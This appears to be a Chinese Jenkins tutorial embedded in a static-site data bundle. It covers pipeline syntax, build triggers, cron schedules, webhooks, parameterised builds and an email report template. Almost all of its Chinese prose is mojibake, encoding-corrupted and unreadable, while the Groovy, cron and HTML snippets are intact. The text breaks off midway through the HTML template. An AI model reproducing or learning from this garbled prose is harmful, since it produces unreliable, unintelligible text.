Pipeline\n * å¤åè½ï¼Pipeline æ¯æç°å®ä¸çä¸­å¤æçæç»­äº¤ä»è¦æ±ãå®æ¯æ fork/joinãå¾ªç¯æ§è¡ï¼å¹¶è¡æ§è¡ä»»å¡çåè½ã\n * å¯æ©å±ï¼Pipeline æä»¶æ¯æå¶ DSL çèªå®ä¹æ©å± ï¼ä»¥åä¸å¶ä»æä»¶éæçå¤ä¸ªéé¡¹ã\n\nå¦ä½åå»º Jenkins Pipelineï¼\n\n * Pipeline èæ¬æ¯ç± Groovy è¯­è¨å®ç°çï¼ä½æ¯æä»¬æ²¡å¿è¦åç¬å»å­¦ä¹  Groovy\n * Pipeline æ¯æä¸¤ç§è¯­æ³ï¼Declarative (å£°æå¼) å Scripted Pipeline (èæ¬å¼) è¯­æ³ï¼Scripted Pipeline æ¯ææ´å¤ç groovy è¯­è¨ï¼ä¸ååèåé£ä¹å¤çç»æåéå¶ãç±äºå¯ä»¥ç¼åçµæ´»çé»è¾ï¼å¯ä»¥è®¤ä¸ºæ¯é«çº§çç pipelineï¼å¦æä½ æ³å®ç°çé»è¾æ¯è¾çµæ´»ï¼æ¯å¦æå¤æ­ãåæ¯ï¼æèéè¦ç¨ groovy è¯­è¨ç¼åå¤æçè¿è¡æ­¥éª¤ï¼é½åºè¯¥éæ©ä½¿ç¨ Scripted Pipelineã\n * Pipeline ä¹æä¸¤ç§åå»ºæ¹æ³ï¼å¯ä»¥ç´æ¥å¨ Jenkins ç Web UI çé¢ä¸­è¾å¥èæ¬ï¼ä¹å¯ä»¥éè¿åå»ºä¸ä¸ª Jenkinsfile èæ¬æä»¶æ¾å¥é¡¹ç®æºç åºä¸­ï¼ä¸è¬æä»¬é½æ¨èå¨ Jenkins ä¸­ç´æ¥ä»æºä»£ç æ§å¶ (SCM) ä¸­ç´æ¥è½½å¥ Jenkinsfile Pipeline è¿ç§æ¹æ³ï¼ã\n\n\n# å®è£ Pipeline æä»¶\n\n\n\n> å®è£å®æ¯è®°å¾éå¯\n\nå®è£æä»¶æå¾å¤ä¾èµæä»¶ä¼å®è£å¤±è´¥ï¼ä¸ç¨ç®¡ï¼åªè¦åå»ºé¡¹ç®çæ¶åå¤äº âæµæ°´çº¿â ç±»åå³å¯ã\n\n\n\nä½ ä¼å¨é¡¹ç®çéç½®ä¸­çå°å¤äºä¸ä¸ªæµæ°´çº¿ï¼å®å°±æ¯åä»£äºä»¥ä¸é¡¹ç®çæå»ºåæå»ºåçä¸äºå·¥ä½ã\n\n\n\nä»¥ä¸æ¯åºäºä¸ä¸ªå£°æå¼ **ï¼Declarativeï¼ç Pipeline**ï¼ä»¥ pipeline å¼å¤´çå°±æ¯å£°æå¼çã\nstagesï¼ä»£è¡¨æ´ä¸ªæµæ°´çº¿çæææ§è¡é¶æ®µãéå¸¸ stages åªæ 1 ä¸ªï¼éé¢åå«å¤ä¸ª stage\nstageï¼ä»£è¡¨æµæ°´çº¿ä¸­çæä¸ªé¶æ®µï¼å¯è½åºç° n ä¸ªãä¸è¬åä¸ºæåä»£ç ï¼ç¼è¯æå»ºï¼é¨ç½²ç­é¶æ®µã\nstepsï¼ä»£è¡¨ä¸ä¸ªé¶æ®µåéè¦æ§è¡çé»è¾ (æ­¥éª¤)ãsteps éé¢æ¯ shell èæ¬ï¼git æåä»£ç ï¼ssh è¿ç¨åå¸ç­ä»»æåå®¹ã\næ¨¡æä¸æ®µï¼ç¶åæ§è¡ççææ\n\npipeline {\n    agent any\n\n    stages {\n        stage('æåä»£ç ') {\n            steps {\n                echo 'æåä»£ç '\n            }\n        }\n        stage('ç¼è¯æå»º') {\n            steps {\n                echo 'ç¼è¯æå»º'\n            }\n        }\n        stage('é¡¹ç®é¨ç½²') {\n            steps {\n                echo 'é¡¹ç®é¨ç½²'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# Scripted Pipeline èæ¬å¼ - Pipeline\n\n\n\n * Nodeï¼èç¹ï¼ä¸ä¸ª Node å°±æ¯ä¸ä¸ª Jenkins èç¹ï¼Master æè Agentï¼æ¯æ§è¡ Step çå·ä½è¿è¡ç¯å¢ï¼åç»­è®²å° Jenkins ç Master-Slave æ¶æçæ¶åç¨å°ã\n * Stageï¼é¶æ®µï¼ä¸ä¸ª Pipeline å¯ä»¥ååä¸ºè¥å¹²ä¸ª Stageï¼æ¯ä¸ª Stage ä»£è¡¨ä¸ç»æä½ï¼æ¯å¦ï¼BuildãTestãDeployï¼Stage æ¯ä¸ä¸ªé»è¾åç»çæ¦å¿µã\n * Stepï¼æ­¥éª¤ï¼Step æ¯æåºæ¬çæä½ååï¼å¯ä»¥æ¯æå°ä¸å¥è¯ï¼ä¹å¯ä»¥æ¯æå»ºä¸ä¸ª Docker éåï¼ç±åç±» Jenkins æä»¶æä¾ï¼æ¯å¦å½ä»¤ï¼sh âmakeâï¼å°±ç¸å½äºæä»¬å¹³æ¶ shell ç»ç«¯ä¸­æ§è¡ make å½ä»¤ä¸æ ·ã\n\nnode {\n    def mvnHome\n    stage('æåä»£ç ') { // for display purposes\n        echo 'æåä»£ç '\n    }\n    stage('ç¼è¯æå»º') {\n        echo 'ç¼è¯æå»º'\n    }\n    stage('é¡¹ç®é¨ç½²') {\n        echo 'é¡¹ç®é¨ç½²'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# ç¼è¯æåé¨ç½²\n\n\n# æåä»£ç \n\nå³äºå£°æå¼ç code ç¼åï¼å¯ä»¥éè¿å¿«æ·çæ¹å¼çæ\n\n\n\n\n\nå¨è¿éå¯ä»¥éç½®æä»¬ç git é¡¹ç®æåå°å\n\n\n\n\n\n\n\n\n# ç¼è¯æå\n\n\n\n\n\n\n\n\n\n\n# è¿ç¨é¨ç½²\n\n\n\nå¾å°åä¾ç¶ç¼è¯æ§è¡ãå¦ææ¯ jar åçï¼å¯ä»¥æåå¨æå¡å¨åå¥½èæ¬æ§è¡ï¼å¨ sh ' æ§è¡ä½ çèæ¬'\n\n\n# æ jenkins ç Pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼\n\nåææä»¬é½æ¯ç´æ¥å¨ Jenkins ç UI çé¢ç¼å Pipeline ä»£ç ï¼è¿æ ·ä¸æ¹ä¾¿èæ¬ç»´æ¤ï¼å»ºè®®æ Pipeline èæ¬æ¾å¨é¡¹ç®ä¸­ï¼ä¸èµ·è¿è¡çæ¬æ§å¶ï¼\n\n1. å¨é¡¹ç®æ ¹ç®å½å»ºç« Jenkinsfile æä»¶ï¼æåå®¹å¤å¶å°è¯¥æä»¶ä¸­ï¼å¹¶æäº¤å° git ä»åº\n\n\n\n2. å¨é¡¹ç®ä¸­å¼ç¨è¯¥æä»¶\n\n\n\n\n\n\n\n",normalizedContent:"jenkins ä¸­èªå¨æå»ºé¡¹ç®çç±»åæå¾å¤ï¼å¸¸ç¨çæä»¥ä¸ä¸ç§ï¼\n\n * èªç±é£æ ¼è½¯ä»¶é¡¹ç®ï¼freestyle projectï¼å¯ä»¥æå»ºä¸åè¯­è¨çé¡¹ç®\n * maven é¡¹ç®ï¼maven projectï¼ä¸é¨åå¯¹ java è¯­è¨é¡¹ç®\n * æµæ°´çº¿é¡¹ç®ï¼pipeline projectï¼çµæ´»åº¦é«ï¼ç¨ä»£ç ç¼å jenkins æå»ºè¿ç¨ï¼å¦ k8s\n\næ¯ç§ç±»åçæå»ºå¶å®é½å¯ä»¥å®æä¸æ ·çæå»ºè¿ç¨ä¸ç»æï¼åªæ¯å¨æä½æ¹å¼ãçµæ´»åº¦ç­æ¹é¢ææåºå«ï¼å¨å®éå¼åä¸­å¯ä»¥æ ¹æ®èªå·±çéæ±åä¹ æ¯æ¥éæ©ãï¼psï¼ä¸ªäººæ¨èä½¿ç¨æµæ°´çº¿ç±»åï¼å ä¸ºçµæ´»åº¦éå¸¸é«ï¼\n\n\n# èªç±é£æ ¼é¡¹ç®æå»º\n\n1. åå»ºèªç±é£æ ¼é¡¹ç®\n\n\n\n\n\n2. éç½® git\n\n\n\n3. æå»º\n\n\n\n\n\n4. ç¼è¯æå\n\necho \"å¼å§ç¼è¯åæå\"\nmvn clean package\necho \"ç¼è¯åæåç»æ\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. é¨ç½²å°ç®æ æº\nå®è£ deploy to container æä»¶ï¼è¿ç§æä»¶éååå¸ war è¿ç§ç±»åçé¡¹ç®ï¼å° tomcat ç­å®¹å¨ä¸å»ã\n\n\n\n\n\n\n\n\n\ntomcat å­è¯éè¦èªå·±ç¾åº¦å»éç½®ä»¥ä¸ï¼å½ä½ éç½®æååï¼å¯ä»¥è®¿é®å° tomcat ç ip:8080/manager/html é¡µé¢ï¼éç½®å®ååå° jenkinsï¼é¨ç½²è¿ç¨ tomcat çæ¶åéè¦è¿ä¸ªå­è¯ã\n\n\n# maven é¡¹ç®\n\n1. å®è£ maven integration æä»¶\n2. æå»º maven é¡¹ç®\n\n\n\n\n\n\n\n\n# pipeline æµæ°´çº¿é¡¹ç®æå»º\n\n\n# pipeline ç®ä»\n\npipelineï¼ç®åæ¥è¯´ï¼å°±æ¯ä¸å¥è¿è¡å¨ jenkins ä¸çå·¥ä½æµæ¡æ¶ï¼å°åæ¥ç¬ç«è¿è¡äºåä¸ªæèå¤ä¸ªèç¹çä»»å¡è¿æ¥èµ·æ¥ï¼å®ç°åä¸ªä»»å¡é¾ä»¥å®æçå¤ææµç¨ç¼æåå¯è§åçå·¥ä½ã\n\nä½¿ç¨ pipeline æä»¥ä¸å¥½å¤ï¼\n\n * ä»£ç ï¼pipeline ä»¥ä»£ç çå½¢å¼å®ç°ï¼éå¸¸è¢«æ£å¥æºä»£ç æ§å¶ï¼ä½¿å¢éè½å¤ç¼è¾ï¼å®¡æ¥åè¿­ä»£å¶ä¼ éæµç¨ã\n * æä¹ï¼æ è®ºæ¯è®¡ååçè¿æ¯è®¡åå¤çæå¡å¨éå¯ï¼pipeline é½æ¯å¯æ¢å¤çã\n * å¯åæ­¢ï¼pipeline å¯æ¥æ¶äº¤äºå¼è¾å¥ï¼ä»¥ç¡®å®æ¯å¦ç»§ç»­æ§è¡ pipeline\n * å¤åè½ï¼pipeline æ¯æç°å®ä¸çä¸­å¤æçæç»­äº¤ä»è¦æ±ãå®æ¯æ fork/joinãå¾ªç¯æ§è¡ï¼å¹¶è¡æ§è¡ä»»å¡çåè½ã\n * å¯æ©å±ï¼pipeline æä»¶æ¯æå¶ dsl çèªå®ä¹æ©å± ï¼ä»¥åä¸å¶ä»æä»¶éæçå¤ä¸ªéé¡¹ã\n\nå¦ä½åå»º jenkins pipelineï¼\n\n * pipeline èæ¬æ¯ç± groovy è¯­è¨å®ç°çï¼ä½æ¯æä»¬æ²¡å¿è¦åç¬å»å­¦ä¹  groovy\n * pipeline æ¯æä¸¤ç§è¯­æ³ï¼declarative (å£°æå¼) å scripted pipeline (èæ¬å¼) è¯­æ³ï¼scripted pipeline æ¯ææ´å¤ç groovy è¯­è¨ï¼ä¸ååèåé£ä¹å¤çç»æåéå¶ãç±äºå¯ä»¥ç¼åçµæ´»çé»è¾ï¼å¯ä»¥è®¤ä¸ºæ¯é«çº§çç pipelineï¼å¦æä½ æ³å®ç°çé»è¾æ¯è¾çµæ´»ï¼æ¯å¦æå¤æ­ãåæ¯ï¼æèéè¦ç¨ groovy è¯­è¨ç¼åå¤æçè¿è¡æ­¥éª¤ï¼é½åºè¯¥éæ©ä½¿ç¨ scripted pipelineã\n * pipeline ä¹æä¸¤ç§åå»ºæ¹æ³ï¼å¯ä»¥ç´æ¥å¨ jenkins ç web ui çé¢ä¸­è¾å¥èæ¬ï¼ä¹å¯ä»¥éè¿åå»ºä¸ä¸ª jenkinsfile èæ¬æä»¶æ¾å¥é¡¹ç®æºç åºä¸­ï¼ä¸è¬æä»¬é½æ¨èå¨ jenkins ä¸­ç´æ¥ä»æºä»£ç æ§å¶ (scm) ä¸­ç´æ¥è½½å¥ jenkinsfile pipeline è¿ç§æ¹æ³ï¼ã\n\n\n# å®è£ pipeline æä»¶\n\n\n\n> å®è£å®æ¯è®°å¾éå¯\n\nå®è£æä»¶æå¾å¤ä¾èµæä»¶ä¼å®è£å¤±è´¥ï¼ä¸ç¨ç®¡ï¼åªè¦åå»ºé¡¹ç®çæ¶åå¤äº âæµæ°´çº¿â ç±»åå³å¯ã\n\n\n\nä½ ä¼å¨é¡¹ç®çéç½®ä¸­çå°å¤äºä¸ä¸ªæµæ°´çº¿ï¼å®å°±æ¯åä»£äºä»¥ä¸é¡¹ç®çæå»ºåæå»ºåçä¸äºå·¥ä½ã\n\n\n\nä»¥ä¸æ¯åºäºä¸ä¸ªå£°æå¼ **ï¼declarativeï¼ç pipeline**ï¼ä»¥ pipeline å¼å¤´çå°±æ¯å£°æå¼çã\nstagesï¼ä»£è¡¨æ´ä¸ªæµæ°´çº¿çæææ§è¡é¶æ®µãéå¸¸ stages åªæ 1 ä¸ªï¼éé¢åå«å¤ä¸ª stage\nstageï¼ä»£è¡¨æµæ°´çº¿ä¸­çæä¸ªé¶æ®µï¼å¯è½åºç° n ä¸ªãä¸è¬åä¸ºæåä»£ç ï¼ç¼è¯æå»ºï¼é¨ç½²ç­é¶æ®µã\nstepsï¼ä»£è¡¨ä¸ä¸ªé¶æ®µåéè¦æ§è¡çé»è¾ (æ­¥éª¤)ãsteps éé¢æ¯ shell èæ¬ï¼git æåä»£ç ï¼ssh è¿ç¨åå¸ç­ä»»æåå®¹ã\næ¨¡æä¸æ®µï¼ç¶åæ§è¡ççææ\n\npipeline {\n    agent any\n\n    stages {\n        stage('æåä»£ç ') {\n            steps {\n                echo 'æåä»£ç '\n            }\n        }\n        stage('ç¼è¯æå»º') {\n            steps {\n                echo 'ç¼è¯æå»º'\n            }\n        }\n        stage('é¡¹ç®é¨ç½²') {\n            steps {\n                echo 'é¡¹ç®é¨ç½²'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# scripted pipeline èæ¬å¼ - pipeline\n\n\n\n * nodeï¼èç¹ï¼ä¸ä¸ª node å°±æ¯ä¸ä¸ª jenkins èç¹ï¼master æè agentï¼æ¯æ§è¡ step çå·ä½è¿è¡ç¯å¢ï¼åç»­è®²å° jenkins ç master-slave æ¶æçæ¶åç¨å°ã\n * stageï¼é¶æ®µï¼ä¸ä¸ª pipeline å¯ä»¥ååä¸ºè¥å¹²ä¸ª stageï¼æ¯ä¸ª stage ä»£è¡¨ä¸ç»æä½ï¼æ¯å¦ï¼buildãtestãdeployï¼stage æ¯ä¸ä¸ªé»è¾åç»çæ¦å¿µã\n * stepï¼æ­¥éª¤ï¼step æ¯æåºæ¬çæä½ååï¼å¯ä»¥æ¯æå°ä¸å¥è¯ï¼ä¹å¯ä»¥æ¯æå»ºä¸ä¸ª docker éåï¼ç±åç±» jenkins æä»¶æä¾ï¼æ¯å¦å½ä»¤ï¼sh âmakeâï¼å°±ç¸å½äºæä»¬å¹³æ¶ shell ç»ç«¯ä¸­æ§è¡ make å½ä»¤ä¸æ ·ã\n\nnode {\n    def mvnhome\n    stage('æåä»£ç ') { // for display purposes\n        echo 'æåä»£ç '\n    }\n    stage('ç¼è¯æå»º') {\n        echo 'ç¼è¯æå»º'\n    }\n    stage('é¡¹ç®é¨ç½²') {\n        echo 'é¡¹ç®é¨ç½²'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# ç¼è¯æåé¨ç½²\n\n\n# æåä»£ç \n\nå³äºå£°æå¼ç code ç¼åï¼å¯ä»¥éè¿å¿«æ·çæ¹å¼çæ\n\n\n\n\n\nå¨è¿éå¯ä»¥éç½®æä»¬ç git é¡¹ç®æåå°å\n\n\n\n\n\n\n\n\n# ç¼è¯æå\n\n\n\n\n\n\n\n\n\n\n# è¿ç¨é¨ç½²\n\n\n\nå¾å°åä¾ç¶ç¼è¯æ§è¡ãå¦ææ¯ jar åçï¼å¯ä»¥æåå¨æå¡å¨åå¥½èæ¬æ§è¡ï¼å¨ sh ' æ§è¡ä½ çèæ¬'\n\n\n# æ jenkins ç pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼pipeline script from scmï¼\n\nåææä»¬é½æ¯ç´æ¥å¨ jenkins ç ui çé¢ç¼å pipeline ä»£ç ï¼è¿æ ·ä¸æ¹ä¾¿èæ¬ç»´æ¤ï¼å»ºè®®æ pipeline èæ¬æ¾å¨é¡¹ç®ä¸­ï¼ä¸èµ·è¿è¡çæ¬æ§å¶ï¼\n\n1. å¨é¡¹ç®æ ¹ç®å½å»ºç« jenkinsfile æä»¶ï¼æåå®¹å¤å¶å°è¯¥æä»¶ä¸­ï¼å¹¶æäº¤å° git ä»åº\n\n\n\n2. å¨é¡¹ç®ä¸­å¼ç¨è¯¥æä»¶\n\n\n\n\n\n\n\n",charsets:{cjk:!0}},{title:"Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è",frontmatter:{title:"Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/505",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/505.Jenkins(%E5%85%AD)%20Jenkins%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E7%BB%86%E8%8A%82.html",relativePath:"01.è¿ç»´/50.Jenkins/505.Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è.md",key:"v-1652c501",path:"/jenkins/505/",headers:[{level:2,title:"åç½®è§¦åå¨",slug:"åç½®è§¦åå¨",normalizedTitle:"åç½®è§¦åå¨",charIndex:2},{level:3,title:"è¿ç¨æå»º",slug:"è¿ç¨æå»º",normalizedTitle:"è¿ç¨æå»º",charIndex:36},{level:3,title:"å¶ä»å·¥ç¨æå»ºåè§¦å",slug:"å¶ä»å·¥ç¨æå»ºåè§¦å",normalizedTitle:"å¶ä»å·¥ç¨æå»ºåè§¦å",charIndex:60},{level:3,title:"å®æ¶æå»º",slug:"å®æ¶æå»º",normalizedTitle:"å®æ¶æå»º",charIndex:135},{level:3,title:"è½®è¯¢SCM",slug:"è½®è¯¢scm",normalizedTitle:"è½®è¯¢ scm",charIndex:188},{level:2,title:"Git hookèªå¨è§¦åæå»º",slug:"git-hookèªå¨è§¦åæå»º",normalizedTitle:"git hook èªå¨è§¦åæå»º",charIndex:829},{level:3,title:"å®è£Gitlab Hookæä»¶",slug:"å®è£gitlab-hookæä»¶",normalizedTitle:"å®è£ gitlab hook æä»¶",charIndex:977},{level:2,title:"Jenkinsçåæ°åæå»º",slug:"jenkinsçåæ°åæå»º",normalizedTitle:"jenkins çåæ°åæå»º",charIndex:1175},{level:3,title:"String Parameter",slug:"string-parameter",normalizedTitle:"string parameter",charIndex:1276},{level:2,title:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",slug:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",normalizedTitle:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",charIndex:1359},{level:3,title:"å®è£ Email Extension æä»¶",slug:"å®è£-email-extension-æä»¶",normalizedTitle:"å®è£ email extension æä»¶",charIndex:1377},{level:3,title:"åå¤é®ä»¶åå®¹",slug:"åå¤é®ä»¶åå®¹",normalizedTitle:"åå¤é®ä»¶åå®¹",charIndex:1504},{level:2,title:"jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼",slug:"jenkins-éç½®-sonarqube-ä»£ç å®¡æ¥",normalizedTitle:"jenkins éç½® sonarqubeï¼ä»£ç å®¡æ¥ï¼",charIndex:5366}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"åç½®è§¦åå¨ è¿ç¨æå»º å¶ä»å·¥ç¨æå»ºåè§¦å å®æ¶æå»º è½®è¯¢SCM Git hookèªå¨è§¦åæå»º å®è£Gitlab Hookæä»¶ Jenkinsçåæ°åæå»º String Parameter éç½®é®ç®±æå¡å¨åéæå»ºç»æ å®è£ Email Extension æä»¶ åå¤é®ä»¶åå®¹ jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼",content:'# åç½®è§¦åå¨\n\nJenkins åç½® 4 ç§æå»ºè§¦åå¨ï¼\n\n * è§¦åè¿ç¨æå»ºï¼éè¿ä¸ä¸ªè¿ç¨å°åè§¦åé¡¹ç®çæ§è¡\n * å¶ä»å·¥ç¨æå»ºåè§¦åï¼Build after other projects are buildï¼ï¼å°±æ¯éè¦åé¢ä¸ä¸ªé¡¹ç®æå»ºå®æåè§¦åæçé¡¹ç®æå»º\n * å®æ¶æå»ºï¼Build periodicallyï¼ï¼é¡¾åæä¹å°±æ¯ ç±»ä¼¼äº corn è¡¨è¾¾å¼ï¼å®æ¶æ§è¡\n * è½®è¯¢ SCMï¼Poll SCMï¼ï¼ä¼å®æ¶æ«ææ¬å°ä»£ç ä»åºæ¯å¦æåæ´ï¼å¦æä»£ç æåæ´å°±è§¦åé¡¹ç®æå»º\n\n\n# è¿ç¨æå»º\n\nå¨é¡¹ç®ä¸­çéç½®ä¸­ï¼æå»ºè§¦åå¨éä¸­è¿ç¨æå»ºã\n\n\n\néè¿æµè§å¨è®¿é® http://192.168.81.102:7777/job/test01/build?token=6666 è¿è¡é¡¹ç®æå»º\n\n\n# å¶ä»å·¥ç¨æå»ºåè§¦å\n\n\n\n\n\nåºç¨ä¿å­åï¼å°±å¯ä»¥æå»º maven_project äºã\n\n\n# å®æ¶æå»º\n\nå®æ¶å­ç¬¦ä¸²ä»å·¦å¾å³åå«ä¸ºï¼ å æ¶ æ¥ æ å¨\nä¸äºå®æ¶è¡¨è¾¾å¼çä¾å­ï¼\n\næ¯30åéæå»ºä¸æ¬¡ï¼Hä»£è¡¨å½¢å(ä»£è¡¨å°æ¶ï¼æµè¯ç¨ *)\nH/30 * * * * 10:02 10:32\næ¯2ä¸ªå°æ¶æå»ºä¸æ¬¡: \nH H/2 * * *\næ¯å¤©ç8ç¹ï¼12ç¹ï¼22ç¹ï¼ä¸å¤©æå»º3æ¬¡ï¼ (å¤ä¸ªæ¶é´ç¹ä¸­é´ç¨éå·éå¼) \n0 8,12,22 * * *\næ¯å¤©ä¸­å12ç¹å®æ¶æå»ºä¸æ¬¡ \nH 12 * * *\næ¯å¤©ä¸å18ç¹å®æ¶æå»ºä¸æ¬¡ \nH 18 * * *\nå¨æ¯ä¸ªå°æ¶çååä¸ªå°æ¶åçæ¯10åé H(0-29)/10 * * * *\næ¯ä¸¤å°æ¶ä¸æ¬¡ï¼æ¯ä¸ªå·¥ä½æ¥ä¸å9ç¹å°ä¸å5ç¹(ä¹è®¸æ¯ä¸å10:38ï¼ä¸å12:38ï¼ä¸å2:38ï¼ä¸å4:38) H H(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# è½®è¯¢ SCM\n\nè¯¥æå»ºè§¦åå¨ï¼Jenkins ä¼å®æ¶æ«ææ¬å°æ´ä¸ªé¡¹ç®çä»£ç ï¼å¢å¤§ç³»ç»çå¼éï¼ä¸å»ºè®®ä½¿ç¨ã\n\n\n\n\n# Git hook èªå¨è§¦åæå»º\n\nå¨ Jenkins çåç½®æå»ºè§¦åå¨ä¸­ï¼è½®è¯¢ SCM å¯ä»¥å®ç° Gitlab ä»£ç æ´æ°ï¼é¡¹ç®èªå¨æå»ºï¼ä½æ¯è¯¥æ¹æ¡çæ§è½ä¸ä½³ãé£ææ²¡ææ´å¥½çæ¹æ¡å¢ï¼ æçãå°±æ¯å©ç¨ Gitlab ç webhook å®ç°ä»£ç  push å°ä»åºï¼ç«å³è§¦åé¡¹ç®èªå¨æå»ºã\n\n\n\n\n# å®è£ Gitlab Hook æä»¶\n\néè¦å®è£ä¸¤ä¸ªæä»¶ï¼Gitlab Hook å GitLabï¼å®è£å¥½åå¨é¡¹ç®éç½®çæå»ºè§¦åå¨ä¸­ï¼ä¼å¤ä¸ä¸ªéé¡¹\n\n\n\nå³äº Gitlab ä¹åçæä½è¯·ç¾åº¦ï¼æè¿éä½¿ç¨çæ¯ giteaã\n\ngitea éè¦ä¸è½½ Generic Webhook Trigger æä»¶ï¼å®è£åå°é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\néç½®å®æåå°±å¯ä»¥æµè¯äºï¼åªè¦æäº¤äºä»£ç å°±ä¼æå»ºé¡¹ç®ã\n\n\n# Jenkins çåæ°åæå»º\n\nææ¶å¨é¡¹ç®æå»ºçè¿ç¨ä¸­ï¼æä»¬éè¦æ ¹æ®ç¨æ·çè¾å¥å¨æä¼ å¥ä¸äºåæ°ï¼ä»èå½±åæ´ä¸ªæå»ºç»æï¼è¿æ¶æä»¬å¯ä»¥ä½¿ç¨åæ°åæå»ºã\n\nJenkins æ¯æéå¸¸ä¸°å¯çåæ°ç±»å\n\n\n\n\n# String Parameter\n\nè¿æ ·çæ¹å¼åªè½éç¨äº pipeline é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nè¿ç§æ¹å¼è¾å¥åªä¸ªåæ¯ï¼å°±æå»ºåªä¸ªåæ¯\n\n\n# éç½®é®ç®±æå¡å¨åéæå»ºç»æ\n\n\n# å®è£ Email Extension æä»¶\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nå¯ä»¥æµè¯åé\n\n> å¦æ jenkins æ¥éï¼ Can\'t send command to SMTP host; æå¯è½æ¯ç®¡çåçé®ç®±æ²¡æå¡«åæèåè®¤è¯èçé®ç®±ä¸ç¸åã\n\n\n# åå¤é®ä»¶åå®¹\n\nå¨é¡¹ç®æ ¹ç®å½ç¼å email.htmlï¼å¹¶ææä»¶æ¨é git\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n    <tr>\n        <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                <li>æå»ºæ¥å¿ï¼&nbsp;\n                    <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                </li>\n                <li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                    <a href="${BUILD_URL}">${BUILD_URL}</a>\n                </li>\n                <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                    <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                </li>\n                <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                    <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n            </ul>\n            ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>Failed Test Results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                $FAILED_TESTS\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: Courier New">\n                ${BUILD_LOG,maxLines=100}\n            </textarea>\n        </td>\n    